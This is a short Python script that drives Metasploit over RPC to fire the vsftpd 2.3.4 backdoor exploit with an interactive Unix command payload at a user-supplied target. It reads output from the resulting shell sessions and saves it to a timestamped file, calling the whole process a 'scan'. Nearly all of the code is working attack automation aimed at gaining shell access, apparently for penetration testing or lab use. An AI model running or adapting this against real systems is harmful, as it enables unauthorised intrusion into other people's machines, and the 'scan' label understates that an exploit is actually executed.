from pymetasploit3.msfrpc import MsfRpcClient
from datetime import datetime
import os

def run_metasploit(target, output_dir="metasploit_output"):
    """
    Run Metasploit scan and store results in a txt file
    
    Args:
        target: Target IP or hostname
        output_dir: Directory to store output files
    """
    
    # Create output directory if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Capture user password
    password = input("Enter Metasploit RPC password: ")
    
    # Initialize results storage
    scan_results = []
    scan_results.append(f"Metasploit Scan Results\n")
    scan_results.append(f"Target: {target}\n")
    scan_results.append(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    scan_results.append("=" * 50 + "\n\n")
    
    try:
        client = MsfRpcClient(password)
        
        # Run exploit
        scan_results.append("Running exploit: unix/ftp/vsftpd_234_backdoor\n")
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target
        payload = client.modules.use('payload', 'cmd/unix/interact')
        exploit.execute(payload=payload)
        
        scan_results.append("Exploit executed successfully\n\n")
        
        # Collect session data
        scan_results.append("Active Sessions:\n")
        scan_results.append("-" * 30 + "\n")
        
        for session in client.sessions.list:
            session_data = client.sessions.session(session).read()
            scan_results.append(f"Session {session}: {session_data}\n")
        
        scan_results.append("\n" + "=" * 50 + "\n")
        scan_results.append("Metasploit scan completed successfully.\n")
        
    except Exception as e:
        scan_results.append(f"\nError during scan: {str(e)}\n")
    
    # Write results to file
    output_file = os.path.join(output_dir, f"metasploit_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(output_file, 'w') as f:
        f.writelines(scan_results)
    
    # Print results to console
    print("".join(scan_results))
    print(f"\nResults saved to: {output_file}")        

